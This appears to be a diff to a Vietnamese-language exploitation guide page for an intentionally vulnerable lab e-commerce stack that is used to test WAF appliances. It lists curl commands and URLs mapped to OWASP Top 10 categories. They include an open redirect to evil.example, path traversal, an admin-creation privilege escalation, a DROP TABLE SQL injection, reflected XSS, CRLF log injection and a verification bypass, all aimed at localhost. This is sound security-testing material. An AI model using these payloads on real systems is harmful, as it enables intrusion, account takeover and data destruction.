@@ -24,7 +24,7 @@
 <body>
   <div class="wrap">
     <h1>OWASP Web Top 10:2025 — Hướng dẫn khai thác</h1>
-    <p class="lead">Public guide — customer mở được không cần đăng nhập. Lỗ hổng luôn active để PoC WAF / Web Security appliance.</p>
+    <p class="lead">Public guide — customer mở được không cần đăng nhập. Lỗ hổng <strong>luôn active</strong> (ADR-044) để PoC WAF / Web Security appliance. ~30+ Web-mapped SC.</p>
     <div class="warn"><strong>Cảnh báo:</strong> XSS/open-redirect/SQLi dưới đây là intentional và chạy thật trên stack.</div>
 
     <div class="card">
@@ -43,20 +43,27 @@
 
     <div class="card" id="a01">
       <h2><span class="tag">A01</span> Broken Access Control</h2>
-      <p>SC-01 IDOR · SC-08 BFLA · SC-33 path traversal BFF · SC-71 open redirect.</p>
+      <p>SC-01 IDOR · SC-08/76/77 BFLA · SC-33 path · SC-71 open redirect · SC-78/79 sessions · SC-87 register roles · SC-95 export.</p>
       <pre># Open redirect sau login (SC-71)
 http://localhost:3000/dang-nhap?next=https://evil.example/phish
 
-# BFF path traversal (SC-33) — admin session cookie
-curl -s "http://localhost:3100/api/bff/catalog/../identity/admin/users" -b "nexatech_admin_session=..."</pre>
+# BFF path traversal (SC-33)
+curl -s "http://localhost:3100/api/bff/catalog/../identity/admin/users" -b "nexatech_admin_session=..."
+
+# SC-76 create as Customer
+curl -s -X POST http://localhost:3001/api/v1/admin/users \
+  -H "content-type: application/json" \
+  -H "x-user-roles: Customer" \
+  -d "{\"email\":\"x@evil.com\",\"fullName\":\"X\",\"password\":\"1\",\"roles\":[\"Admin\"]}"</pre>
     </div>
 
     <div class="card" id="a02">
       <h2><span class="tag">A02</span> Security Misconfiguration</h2>
-      <p>SC-28 insecure cookies · SC-30 CORS * · SC-67 debug · SC-74 thiếu X-Frame-Options/CSP.</p>
+      <p>SC-28 cookies · SC-30/89 CORS · SC-67 debug · SC-74 frames · SC-82 cache · SC-90 inventory · SC-91 set-cookie.</p>
       <pre>curl -sI http://localhost:3000/ | findstr /i "x-frame content-security"
-curl -s http://localhost:3001/health/debug</pre>
-      <p>Kỳ vọng: thiếu frame protection headers trên nhiều response; debug dump có configHint.</p>
+curl -s http://localhost:3001/health/debug
+curl -sI http://localhost:3001/lab/set-cookie
+curl -s http://localhost:3001/lab/api-inventory</pre>
     </div>
 
     <div class="card" id="a03">
@@ -66,50 +73,52 @@ curl -s http://localhost:3001/health/debug</pre>
 
     <div class="card" id="a04">
       <h2><span class="tag">A04</span> Cryptographic Failures</h2>
-      <p>SC-66 weak secret compare (shipping webhook) · SC-24 OTP cố định · SC-70 JWT alg=none flag.</p>
+      <p>SC-66 · SC-24 · SC-70 · SC-86 GET password · SC-93 token Location.</p>
       <pre>curl -s "http://localhost:3001/lab/jwt-alg-none?sub=USER_ID"
-curl -s http://localhost:3001/api/v1/auth/me -H "Authorization: Bearer SAMPLE_UNSIGNED_JWT"</pre>
+curl -s "http://localhost:3001/lab/login-get?email=a@b.c&password=Secret"
+curl -sI "http://localhost:3001/lab/oauth-callback?token=secret&next=https://evil.example"</pre>
     </div>
 
     <div class="card" id="a05">
       <h2><span class="tag">A05</span> Injection</h2>
-      <p>SC-63 SQL ORDER BY · SC-72 reflected XSS trên tìm kiếm.</p>
-      <pre># SQLi via sort (catalog)
-curl -s "http://localhost:3003/api/v1/products?sort=id;%20DROP%20TABLE%20products--"
-
-# Reflected XSS (browser)
-http://localhost:3000/tim-kiem?q=%3Cimg%20src=x%20onerror=alert(1)%3E</pre>
-      <p>Trang search echo <code>q</code> bằng <code>dangerouslySetInnerHTML</code> (intentional).</p>
+      <p>SC-63 SQLi · SC-72 XSS · SC-81 host header · SC-83 header reflect · SC-94 MIME.</p>
+      <pre>curl -s "http://localhost:3003/api/v1/products?sort=id;%20DROP%20TABLE%20products--"
+http://localhost:3000/tim-kiem?q=%3Cimg%20src=x%20onerror=alert(1)%3E
+curl -s http://localhost:3001/lab/reflect-headers -H "x-trace-id: evil"
+curl -s "http://localhost:3001/lab/content-type?type=text/html"</pre>
     </div>
 
     <div class="card" id="a06">
       <h2><span class="tag">A06</span> Insecure Design</h2>
-      <p>SC-12 price manipulation · SC-20 amount mismatch · SC-58 unlimited checkout.</p>
+      <p>SC-12 price · SC-20 amount · SC-58 unlimited checkout.</p>
     </div>
 
     <div class="card" id="a07">
       <h2><span class="tag">A07</span> Authentication Failures</h2>
-      <p>SC-21 no rate limit · SC-24 OTP 000000 · SC-75 user enumeration details trên auth failure paths khi wired.</p>
+      <p>SC-21 · SC-24 · SC-75 · SC-80 · SC-84 · SC-85 · SC-92.</p>
       <pre>curl -s -X POST http://localhost:3001/api/v1/auth/login \
   -H "content-type: application/json" \
-  -d "{\"email\":\"nobody@nexatech.local\",\"password\":\"x\"}"</pre>
+  -d "{\"email\":\"nobody@nexatech.local\",\"password\":\"x\"}"
+curl -s "http://localhost:3001/lab/verify-bypass?email=victim@nexatech.local"</pre>
     </div>
 
     <div class="card" id="a08">
       <h2><span class="tag">A08</span> Integrity Failures</h2>
-      <p>SC-18 forged VNPay signature · SC-17 replay · SC-61 forged partner webhook · SC-73 CSRF Origin không enforce.</p>
-      <pre># CSRF: submit state-changing request từ origin lạ — server không reject Origin</pre>
+      <p>SC-18 forged sig · SC-17 replay · SC-61 webhook · SC-73 CSRF Origin skip.</p>
+      <pre># CSRF: POST /api/auth/login từ origin lạ — Origin không bị enforce</pre>
     </div>
 
     <div class="card" id="a09">
       <h2><span class="tag">A09</span> Logging Failures</h2>
-      <p>SC-64 — LOGIN_FAILURE audit bị suppress (<code>shouldEmitSecurityAudit=false</code>).</p>
+      <p>SC-64 LOGIN_FAILURE audit suppress · SC-83 reflected headers (log injection vector).</p>
+      <pre>curl -s http://localhost:3001/lab/reflect-headers -H "x-trace-id: evil%0aFAKE_LOG"</pre>
     </div>
 
     <div class="card" id="a10">
       <h2><span class="tag">A10</span> Exceptional Conditions</h2>
       <pre>curl -s "http://localhost:3001/health/debug?fail=1"
-# details.stack + details.internalUrl + failOpenHint</pre>
+curl -s http://localhost:3001/lab/error-stack
+# details.stack + internalUrl / raw stack</pre>
     </div>
 
     <footer>
